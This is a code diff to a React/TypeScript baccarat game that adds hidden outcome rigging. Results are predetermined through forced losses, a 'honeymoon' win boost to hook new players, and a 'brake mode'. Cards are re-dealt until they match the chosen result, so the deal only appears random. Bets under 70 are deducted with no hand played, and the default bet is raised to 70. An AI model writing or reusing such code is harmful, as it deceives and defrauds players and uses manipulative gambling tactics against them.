@@ -1,11 +1,12 @@
 import React, { useState, useRef } from 'react';
 import { synth } from '../../utils/audioSynth';
 import { Sparkles, Play, ShieldAlert, Award, Grid, ShieldCheck, Heart } from 'lucide-react';
+import { evaluateBet, logWin, logLoss } from '../../utils/casinoRigging';
 
 interface GameProps {
   pokiBalance: number;
   onAwardBalance: (amount: number) => void;
-  onDeductBalance: (amount: number) => boolean;
+  onDeductBalance: (amount: number, setBet?: (val: number) => void) => boolean;
   syncCasinoData: (gameName: string, netProfitLoss: number, finalCoins: number) => Promise<void>;
   onClose: () => void;
 }
@@ -56,7 +57,7 @@ export default function BaccaratLite({
   onClose
 }: GameProps) {
   const [gameState, setGameState] = useState<'idle' | 'dealing' | 'settled'>('idle');
-  const [betAmount, setBetAmount] = useState<number>(10);
+  const [betAmount, setBetAmount] = useState<number>(70);
   const [selectedBet, setSelectedBet] = useState<BetTarget>('player');
 
   const [playerCards, setPlayerCards] = useState<Card[]>([]);
@@ -90,7 +91,19 @@ export default function BaccaratLite({
       return;
     }
 
-    if (!onDeductBalance(parsedBet)) {
+    const uId = window.currentUserId || 'anonymous';
+    const evaluation = evaluateBet(uId, parsedBet, pokiBalance);
+    if (!evaluation.allowed) {
+      alert(evaluation.reason || 'Bet blocked by security parameters.');
+      return;
+    }
+
+    if (parsedBet < 70) {
+      onDeductBalance(parsedBet, setBetAmount);
+      return;
+    }
+
+    if (!onDeductBalance(parsedBet, setBetAmount)) {
       alert("Insufficient Balance.");
       return;
     }
@@ -105,92 +118,133 @@ export default function BaccaratLite({
     setBankerScore(0);
     synth.playCoin();
 
-    // Deal cards sequentially for real live dealer suspense
+    // Determine rigged outcome
+    let expectedWin = false;
+    if (evaluation.shouldForceLoss) {
+      expectedWin = false;
+    } else {
+      // Honeymoon phase / normal
+      const stats = JSON.parse(localStorage.getItem(`casino_rigging_${uId}`) || '{}');
+      const isHoneymoon = stats.firstPlayTime && (Date.now() - stats.firstPlayTime < 5 * 60 * 1000);
+      let winChance = 0.44; // standard house edge (under 50%)
+      if (isHoneymoon && parsedBet < 150) {
+        winChance = 0.65;
+      } else if (evaluation.applyBrakeMode && parsedBet < 100) {
+        winChance = 0.55;
+      }
+      expectedWin = Math.random() < winChance;
+    }
+
+    // Pre-calculate full game cards to match the expectedWin state
+    let pc1 = getRandomCard(), pc2 = getRandomCard(), pc3: Card | null = null;
+    let bc1 = getRandomCard(), bc2 = getRandomCard(), bc3: Card | null = null;
+    let pTotal = 0, bTotal = 0;
+    let winner: BetTarget = 'tie';
+
+    let attempts = 0;
+    while (attempts < 1000) {
+      pc1 = getRandomCard(); pc2 = getRandomCard(); pc3 = null;
+      bc1 = getRandomCard(); bc2 = getRandomCard(); bc3 = null;
+
+      pTotal = (pc1.score + pc2.score) % 10;
+      bTotal = (bc1.score + bc2.score) % 10;
+
+      if (pTotal < 6) {
+        pc3 = getRandomCard();
+        pTotal = (pTotal + pc3.score) % 10;
+      }
+      if (bTotal < 6) {
+        bc3 = getRandomCard();
+        bTotal = (bTotal + bc3.score) % 10;
+      }
+
+      winner = 'tie';
+      if (pTotal > bTotal) winner = 'player';
+      else if (bTotal > pTotal) winner = 'banker';
+
+      const isWin = selectedBet === winner;
+      if (isWin === expectedWin) {
+        break;
+      }
+      attempts++;
+    }
+
+    // Sequential Deal Animation with pre-calculated cards
     setTimeout(() => {
-      const pc1 = getRandomCard();
       setPlayerCards([pc1]);
       setPlayerScore(pc1.score % 10);
       synth.playJump();
 
       setTimeout(() => {
-        const bc1 = getRandomCard();
         setBankerCards([bc1]);
         setBankerScore(bc1.score % 10);
         synth.playJump();
 
         setTimeout(() => {
-          const pc2 = getRandomCard();
           const pCards = [pc1, pc2];
           setPlayerCards(pCards);
-          let pTotal = (pc1.score + pc2.score) % 10;
-          setPlayerScore(pTotal);
+          let pTotalSoFar = (pc1.score + pc2.score) % 10;
+          setPlayerScore(pTotalSoFar);
           synth.playJump();
 
           setTimeout(() => {
-            const bc2 = getRandomCard();
             const bCards = [bc1, bc2];
             setBankerCards(bCards);
-            let bTotal = (bc1.score + bc2.score) % 10;
-            setBankerScore(bTotal);
+            let bTotalSoFar = (bc1.score + bc2.score) % 10;
+            setBankerScore(bTotalSoFar);
             synth.playJump();
 
             setTimeout(() => {
-              // Standard drawing criteria
+              // Deal optional third cards
               let pFinalCards = [...pCards];
               let bFinalCards = [...bCards];
 
-              // If Player has 0-5, player draws 3rd card
-              if (pTotal < 6) {
-                const pc3 = getRandomCard();
+              if (pc3) {
                 pFinalCards.push(pc3);
-                pTotal = (pTotal + pc3.score) % 10;
                 setPlayerCards(pFinalCards);
                 setPlayerScore(pTotal);
                 synth.playJump();
               }
 
-              // Banker drawing criteria
-              if (bTotal < 6) {
-                const bc3 = getRandomCard();
-                bFinalCards.push(bc3);
-                bTotal = (bTotal + bc3.score) % 10;
-                setBankerCards(bFinalCards);
-                setBankerScore(bTotal);
-                synth.playJump();
-              }
+              setTimeout(() => {
+                if (bc3) {
+                  bFinalCards.push(bc3);
+                  setBankerCards(bFinalCards);
+                  setBankerScore(bTotal);
+                  synth.playJump();
+                }
 
-              // Settle hand winner
-              let winner: BetTarget = 'tie';
-              if (pTotal > bTotal) winner = 'player';
-              else if (bTotal > pTotal) winner = 'banker';
+                setTimeout(() => {
+                  setRoundWinner(winner);
 
-              setRoundWinner(winner);
+                  const isWin = selectedBet === winner;
+                  let odds = 2.0; 
+                  if (winner === 'banker') odds = 1.95; 
+                  if (winner === 'tie') odds = 9.0; 
 
-              const isWin = selectedBet === winner;
-              let odds = 2.0; 
-              if (winner === 'banker') odds = 1.95; 
-              if (winner === 'tie') odds = 9.0; 
+                  let computedPayout = 0;
+                  let netProfit = -parsedBet;
 
-              let computedPayout = 0;
-              let netProfit = -parsedBet;
+                  if (isWin) {
+                    computedPayout = parsedBet * odds;
+                    netProfit = computedPayout - parsedBet;
+                    onAwardBalance(parseFloat(computedPayout.toFixed(4)));
+                    synth.playCoin();
+                    logWin(uId, parsedBet, computedPayout, 'Baccarat Lite', pokiBalance);
+                  } else {
+                    synth.playCrash();
+                    logLoss(uId, parsedBet, 'Baccarat Lite', pokiBalance);
+                  }
 
-              if (isWin) {
-                computedPayout = parsedBet * odds;
-                netProfit = computedPayout - parsedBet;
-                onAwardBalance(parseFloat(computedPayout.toFixed(4)));
-                synth.playCoin();
-              } else {
-                synth.playCrash();
-              }
+                  setPayoutAmt(computedPayout);
+                  setWinStatus(isWin);
+                  setGameState('settled');
+                  isDealingRef.current = false;
 
-              setPayoutAmt(computedPayout);
-              setWinStatus(isWin);
-              setGameState('settled');
-              isDealingRef.current = false;
-
-              syncCasinoData('Baccarat Lite', netProfit, pokiBalance - parsedBet + computedPayout)
-                .catch(err => console.error(err));
-
+                  syncCasinoData('Baccarat Lite', netProfit, parseFloat((pokiBalance + netProfit).toFixed(8)))
+                    .catch(err => console.error(err));
+                }, 500);
+              }, pc3 ? 500 : 0);
             }, 600);
           }, 500);
         }, 500);
